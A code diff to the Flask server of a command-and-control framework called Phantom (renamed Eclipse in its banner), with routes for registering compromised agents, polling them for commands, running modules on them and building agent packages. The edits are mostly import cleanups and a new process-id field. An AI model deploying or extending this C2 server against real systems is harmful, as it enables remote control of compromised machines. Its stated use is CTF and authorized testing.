@@ -1,12 +1,13 @@
 """
 Phantom C2 Server — Mr. Robot styled Command & Control.
-Backend core: Flask + Flask-SocketIO.
+Backend: Flask + Flask-SocketIO
 """
-from flask import Flask
-from flask_socketio import SocketIO
-import os, json, time, uuid, threading
+import os, sys, json, time, uuid, threading
 from datetime import datetime
+from flask import Flask, request, jsonify, render_template, send_file
+from flask_socketio import SocketIO, emit
 
+sys.path.insert(0, os.path.dirname(__file__))
 from persistence import Persistence
 from agent_manager import AgentManager
 from module_loader import ModuleLoader
@@ -21,10 +22,9 @@ persist = Persistence(DB_PATH)
 agent_mgr = AgentManager(persist, socketio)
 module_loader = ModuleLoader(persist)
 
-# ---------- routes ----------
 @app.route('/')
 def index():
-    return app.send_static_file('terminal.html')
+    return render_template('terminal.html')
 
 @app.route('/api/register', methods=['POST'])
 def register_agent():
@@ -37,6 +37,7 @@ def register_agent():
         'arch': data.get('arch', 'unknown'),
         'privileges': data.get('privileges', 'user'),
         'ip': request.remote_addr,
+        'pid': data.get('pid'),
         'last_seen': time.time(),
         'connected': True,
         'status': 'active'
@@ -48,8 +49,7 @@ def register_agent():
 def poll_commands(aid):
     if aid not in agent_mgr.agents:
         return jsonify({'error': 'not found'}), 404
-    agent = agent_mgr.agents[aid]
-    agent['last_seen'] = time.time()
+    agent_mgr.agents[aid]['last_seen'] = time.time()
     pending = agent_mgr.pending_commands(aid)
     return jsonify({'commands': pending})
 
@@ -127,17 +127,15 @@ def execute_module(aid, module_name):
 def build_agent():
     config = request.args.to_dict()
     buf, name = build_agent_zip(config)
-    from flask import send_file
     return send_file(buf, mimetype='application/zip', as_attachment=True, download_name=name)
 
 @app.route('/api/results/<aid>')
 def get_results(aid):
     return jsonify(persist.get_results(aid))
 
-from flask import request
 @socketio.on('connect')
 def on_connect():
-    emit('connected', {'msg': 'Phantom C2 link established'})
+    emit('connected', {'msg': 'Link established'})
 
 if __name__ == '__main__':
     print("""
@@ -145,8 +143,8 @@ if __name__ == '__main__':
 ║╚╝║║╣ ╠╦╝║║║║║║║║ ║╠═╝╠╦╝
 ╩╩╩╩╚═╝╩╚═╩ ╩╩╝╚╝╚═╝╩ ╩ ╩
 """)
-    print("[*] Phantom C2 — CTF / Authorized Testing Only")
-    print("[*] Dashboard : http://0.0.0.0:8080")
-    print("[*] API       : http://0.0.0.0:8080/api")
-    print("[*] WebSocket : enabled\n")
+    print('[*] Eclipse C2 — CTF / Authorized Testing Only')
+    print('[*] Dashboard : http://0.0.0.0:8080')
+    print('[*] API       : http://0.0.0.0:8080/api')
+    print('[*] WebSocket : enabled\n')
     socketio.run(app, host='0.0.0.0', port=8080, debug=False, use_reloader=False)
